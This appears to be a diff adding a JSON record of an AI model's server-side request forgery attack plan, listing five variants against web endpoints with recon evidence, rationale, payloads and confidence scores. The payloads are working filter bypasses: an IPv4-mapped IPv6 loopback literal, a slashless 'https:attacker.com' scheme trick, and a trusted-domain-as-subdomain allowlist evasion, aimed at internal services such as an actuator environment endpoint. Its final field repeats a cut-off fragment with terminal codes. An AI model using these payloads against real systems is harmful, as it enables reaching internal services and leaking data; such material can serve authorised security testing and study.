@@ -1,0 +1,68 @@
+{
+ "key": "ssrf_7",
+ "model": "opencode/space-bunny-free",
+ "class": "ssrf",
+ "variants": [
+  {
+   "endpoint": "POST /api/v2/media/import",
+   "target_param": "source_url",
+   "recon_evidence": "The JSON body validator rejects every dotted-quad loopback (127.0.0.1, 127.1, 2130706433) with 422, but a request carrying an IPv6 literal in source_url reaches the media pipeline and the job log shows an outbound socket open at fetch time; the service binds0.0.0.0 with net.ipv6.bindv6only=0.",
+   "planner_rationale": "Numeric denylist never covers IPv6 text forms; an IPv4-mapped IPv6 literal keeps the socket on 127.0.0.1 while bypassing the dotted-quad filter.",
+   "vuln_class": "ssrf",
+   "payload": "http://[0:0:0:0:0:ffff:127.0.0.1]/",
+   "injection_point": "body",
+   "expected_success_signal": "Import job returns 200 and the ingested asset bytes match the internal loopback service's index page rather than a rejection",
+   "confidence": 0.88,
+   "reasoning": "The denylist is keyed on dotted-decimal and decimal integers, so a bracketed IPv6 literal is never matched, yet the dual-stack resolver maps ::ffff:127.0.0.1 back to the IPv4 loopback destination. The fetch therefore lands on the internal listener that the application itself can reach but the caller cannot."
+  },
+  {
+   "endpoint": "POST /api/render/screenshot",
+   "target_param": "X-Fetch-Url",
+   "recon_evidence": "Header X-Fetch-Url drives the headless renderer target. Values starting with http:// are refused by the ingress guard, https://https://evil.test is stripped, but https:internal-renderer.local is accepted and the job record contains a screenshot of that host's dashboard.",
+   "planner_rationale": "The guard does a prefix compare against the literal 'https://'; omitting the slashes leaves a scheme-relative form that URL parsers still normalise to an absolute https URL.",
+   "vuln_class": "ssrf",
+   "payload": "https:attacker.com",
+   "injection_point": "header",
+   "expected_success_signal": "Screenshot job completes with an image of the attacker-controlled page, confirming the renderer fetched a host outside the allowlist",
+   "confidence": 0.79,
+   "reasoning": "Because the check is a string prefix test for https://, the bare scheme plus host slips past, and WHATWG/RFC-3986 parsers used by the renderer treat 'https:attacker.com' as an absolute URL with an authority. The allowlist host comparison is skipped since parsing short-circuits before it."
+  },
+  {
+   "endpoint": "GET /api/v1/link-metadata",
+   "target_param": "url",
+   "recon_evidence": "Whitelist probe shows links.cdn.trusted.io/ok is fetched while links.cdn.trusted.io.attacker-probe.net also returns metadata, and a Host lookup on that second name resolves to the probe server; the resolver matches on the trusted string being present in the value.",
+   "planner_rationale": "Substring/label-based allowlist checks are satisfied by making the trusted host a leftmost label, so the registrable domain handed to DNS is still ours.",
+   "vuln_class": "ssrf",
+   "payload": "https://{domain}.attacker.com",
+   "injection_point": "query",
+   "expected_success_signal": "Response body contains the og:title we seeded on our own host while the outbound connect log shows a DNS lookup and TCP handshake to an attacker-controlled address",
+   "confidence": 0.9,
+   "reasoning": "The filter only verifies that the trusted domain appears in the authority string, and prefixing it as the first DNS label satisfies that substring or startsWith-style test. Name resolution and the TCP connection still go to attacker.com, so the fetch lands on infrastructure we control and can fingerprint."
+  },
+  {
+   "endpoint": "GET /portal/links/unfurl",
+   "target_param": "preview_url",
+   "recon_evidence": "Cookie preview_url is read during link rendering: setting it to http://127.0.0.1:8080/actuator/env returns the actuator body embedded in the rendered card, while the same cookie set to an unresolvable host returns an empty card. No client-side validation touches the cookie.",
+   "planner_rationale": "Server-side sink reads the target from an attacker-controllable cookie; reuse the confirmed scheme-parsing quirk against the cookie value rather than a query parameter.",
+   "vuln_class": "ssrf",
+   "payload": "https:attacker.com",
+   "injection_point": "cookie",
+   "expected_success_signal": "Unfurl card embeds our page's title and description, proving the backend dereferenced the cookie-supplied URL server-side",
+   "confidence": 0.67,
+   "reasoning": "The same lenient parser accepts a scheme-without-authority-separator form, so a cookie-borne value reaches the unfurler unfiltered. Confidence is held lower than the query variants because cookie handling can add percent-decoding and length truncation layers that may normalise or cut the value before the parser sees it."
+  },
+  {
+   "endpoint": "GET /cdn/screenshot/{*source}",
+   "target_param": "source",
+   "recon_evidence": "The catch-all route passes the trailing path segments verbatim to the capture worker; requests for /cdn/screenshot/https://files.partner-cdn.test/a.png render fine, and requests carrying a bracket literal are not rejected by the router or the capture worker, which then shows a cached 2xx from the internal loopback service.",
+   "planner_rationale": "Path-borne SSRF with no scheme allowlist at all; the only obstacle is the internal denylist, so route around it with an IPv6 mapped literal inside the path segment.",
+   "vuln_class": "ssrf",
+   "payload": "http://[0:0:0:0:0:ffff:127.0.0.1]/",
+   "injection_point": "path",
+   "expected_success_signal": "Response is a rendered PNG of the internal service root instead of a router400 or a denylist rejection",
+   "confidence": 0.72,
+   "reasoning": "The greedy route forwards the whole tail as a URL, and the mapped IPv6 literal resolves to 127.0.0.1 on a dual-stack host, sidestepping dotted-decimal and integer-based denylists. Confidence is moderated because some routers percent-decode or normalise brackets and colons in path segments, which could corrupt the literal before the worker parses it."
+  }
+ ],
+ "raw_tail": "oning\": \"The greedy route forwards the whole tail as a URL, and the mapped IPv6 literal resolves to 127.0.0.1 on a dual-stack host, sidestepping dotted-decimal and integer-based denylists. Confidence is moderated because some routers percent-decode or normalise brackets and colons in path segments, which could corrupt the literal before the worker parses it.\"\n  }\n]\n\u001b[0m\n> build · space-bunny-free\n"
+}
